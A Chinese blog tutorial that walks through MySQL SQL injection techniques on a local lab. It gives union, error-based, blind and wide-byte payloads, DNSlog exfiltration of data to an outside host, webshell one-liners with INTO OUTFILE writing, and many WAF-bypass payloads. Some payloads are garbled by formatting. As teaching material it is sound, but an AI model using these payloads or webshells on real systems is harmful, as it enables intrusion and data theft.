---
title: sql注入之重新学习
tags: 
  - 报错注入
  - SQL注入
  - 显错注入
  - 盲注
  - 宽字节注入
ccategories: web安全
keywords: 'web安全,sql注入,显错注入,报错注入,盲注,宽字节注入'
description: 基于mysql进行sql注入的全方位讲解
cover: /images/sql.jpeg
date: 2020-09-02 10:45:41
---

<meta name="referrer" content="no-referrer"/>

## SQL注入

### 概念：
SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。
在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如[http://www.xxx.com/i.php?id=13](http://www.xxx.com/i.php?id=13)。
此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。
### SQL注入的条件
1、用户可以控制输入的数据，可以控制传参的内容。
2、用户传参的内容被拼接到了代码去执行。

### 判断是否存在SQL注入的具体流程:
1、首先获取url：[http://www.xxx.com/i.php?id=1](http://www.xxx.com/i.php?id=1)
2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id='1'
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554)
3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select*from test where id ='1''，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554)
4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554)
5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select*from test where id ='1' and 1=2 #'
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554)
这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。
在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。

### SQL注入分类
#### 显错注入
有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。
1、首先可以看到，传参id=1会输出两个数据：login name和password。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277)
2、加个单引号，页面报错了
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277)
3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277)
4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278)
5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277)
6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。
```sql
?id=-1' union select 1,flag,3 from flag %23
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277)
#### 报错注入
通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。
1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277)
2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277)
3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277)
4、使用报错函数updataxml()查询当前数据库库名。payload如下：
?id=1 and updatexml(1,concat(0x7e,(select database())),1)
这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277)
5、获取flag表中的数据。
[http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1) and updatexml(1,concat(0x7e,(select flag from flag)),1)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277)
6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。
获取第一个字符开始的20个数据：
?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277)
获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：
?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277)
### 盲注
对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。
#### 布尔盲注
布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：
1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277)
2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277)
3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277)
4、通过length()函数判断数据库库名的长度大于1。
?id=1' and length(database())>1 %23
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277)
5、在大于8的时候页面返回空，所以数据库库名长度等于8。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277)
6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码
?id=1' and ascii(substr((select database()),1,1))>97 %23
?id=1' and ascii(substr((select database()),1,1))=101 %23
首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277)
7、更改截取的位置，判断后面的字符对应的ascii码值。
?id=1' and ascii(substr((select database()),2,1))=101 %23
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277)
#### 延时盲注
延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。
1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554)
2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277)
3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。
?id=2' and if((length(database())=8),sleep(5),1) %23
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277)
4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。
?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277)
5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533)
### 宽字节注入
为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入'（单引号）或者"（双引号）进行闭合的时候，程序会自动在前面加上\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。
在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。


#### 宽字节注入具体解析过程:
1、在id传参后面加上%df和单引号
2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\’，即?id=1%df\’ and 1=1 %23
url编码为：?id=1%df%5C%27%20and%201%3D1%20%23
3、PHP将处理好的数据带入mysql处理时使用了gbk编码
4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\（反斜线）
5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合


#### 实例演示：
1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316688943-fc742097-f3f9-40f1-b326-a4dd94d9691f.png#align=left&display=inline&height=217&margin=%5Bobject%2Object%5D&name=image.png&originHeight=435&originWidth=554&size=138295&status=done&style=none&width=277)
2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316696285-c4740da5-d4f3-4e5e-b82e-a102fbba775d.png#align=left&display=inline&height=232&margin=%5Bobject%2Object%5D&name=image.png&originHeight=463&originWidth=554&size=157491&status=done&style=none&width=277)
3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316701085-c5629ba1-eecd-4178-b782-2c8d1e94f979.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=554&size=111411&status=done&style=none&width=277)
4、通过union select 判断出注入点为2和3。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277)
5、通过注入点3获取flag数据表中的flag字段的数据。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277)
## 巧用dnslog进行SQL注入
前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。
### Dnslog
dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。
### Load_file()函数
数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：
1.文件在服务器上
2.指定完整路径的文件
3.必须有FILE权限
### UNC路径
UNC路径就是类似\softer这样的形式的网络路径。它符合 \服务器名\服务器资源的格式。在Windows系统中常用于共享文件。如\192.168.1.1\共享文件夹名。
### Dnslog注入实例演示
1、打开实例站点，很明显这里是只能使用盲注的站点。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277)
2、通过order by判断出字段数为3。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277)
3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277)
4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：
?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn
/abc')) %23
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277)
5、执行语句之后在dnslog日志中获取到数据库库名为security。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277)
6、修改子查询里的内容，获取其他数据。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277)
## SQL注入写入webshell
### Webshell
Webshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：
**jsp**
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
**asp**
success!!!!<%eval request("cmd")%>
**php**
### out_file&dump_file
在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。
通过sql注入写webshell的具体用法：
select  into outfile 'C:/phpStudy/WWW/1.php'
select  into dumpfile 'C:/phpStudy/WWW/1.php'
二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。
在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。
## SQL注入如何绕过waf
在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:
If(xxx){
拦截！
}else{
通过
}
所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：
#### 1、大小写绕过
?id=1 and UnIoN sElEcT 1,2,3
?id=1 OrDeR By 1
#### 2、双写绕过
一些防护措施只进行一次，可以通过双写关键字的方法绕过。
Id=1 ununionion selselectect 1,2,3 删除一次--> union select
Id=1 ororderder bbyy	1	删除一次--> order by
#### 3、编码绕过
如果检测的是关键字，那么经过编码即可绕过
URL全编码：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277)
十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277)
#### 4、基本符号替换
用&&替换and
用||替换or
用/**/替换空格
URL栏中用+替换空格
#### 5、报错注入替换函数绕过
有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：
1.floor()
id = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)
2. extractvalue()
id = 1 and (extractvalue(1, concat(0x5c,(select user()))))
id = 1 and extractvalue(1,concat(char(126),database()))
3. updatexml()
id = 1 and (updatexml(0x3a,concat(1,(select user())),1))


4.exp()
exp(~(select * from(select user()))a))


5.GeometryCollection()
Id=1 and GeometryCollection((select _ from(select _ from(select user())a)b))


6.Polygon


Id = 1 and polygon((select _ from (select _ from(select user())a)b))


7.Multipoint()


Id = 1 and Multipoint ((select _ from (select _ from(select user())a)b))


8.Multilinestring()


Id = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))


9.multipolygon


Id = 1 and multipolygon ((select _ from (select _ from(select user())a)b))


10.linestring()


Id = 1 and linestring ((select _ from (select _ from(select user())a)b))


#### 6、其他等价函数绕过
hex()、bin() ==> ascii()
sleep() >benchmark()
concat_ws()>group_concat()
mid()、substr() ==> substring()
@[@user ](/user ) ==> user() 
@[@database ](/database ) ==> database() 


#### 7、内联注释配合注释绕过
Id=1/**//_! order_/+/_!by_/+1


#### 8、%0a换行跳出单行注释绕过
原理：数据库中对于#和--（空格）后面的东西都进行注释忽略处理
我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。
Payload：
id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201
id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3
#### 9、利用一些中间件的缺陷
（1）IIS+ASP
通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min
（2）IIS的Unicode编码
IIS支持Unicode编码，可以通过编码关键词进行绕过：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277)
（3）HTTP参数污染
有的时候，浏览器对于这样的传参会出现以下情况：
Id=1 and id=2 --> 出现在服务器中，id=1,2
那么我们可以这样绕：
id=1 and union select username & id= password form admin
--> id=1 and union select username, password form admin


对于这种参数重复传参的情况，不同环境有不同结果：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277)
#### 10、更换传参方式绕过
在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277)
#### 11、利用数据提取方式的缺陷进行绕过
Example：
在PHP+Apache中
x=1&y=2&z=3 在某些waf中会被提取为：
x=1
y=2
z=3
payload:
id=1+union+/_&x=2_/+select/_&y=3_/+1,2,3+from+admin
waf检测方式为分别检测三个传参：
id=1+union+/*
x=2_/+select/_
y=3*/1,2,3+from+admin


数据库中，/**/中间的东西被过滤了，获得的传参为：
id=1+union+select+1,2,3+from+admin
#### 12、脏数据绕过
在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277)
下面给出生成垃圾数据的脚本：
#coding=utf-8
import random,string
from urllib import parse
code by yzddMr6


varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
str_list = [random.choice(string.ascii_letters) for i in range(length)]
random_str = ''.join(str_list)
return random_str
def main():
data={}
for i in range(num_min,num_max):
data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
print('&'+parse.urlencode(data)+'&')
main()


### SQL注入实战渗透测试
1、首先打开指定站点，这里是以beescms搭建的网站
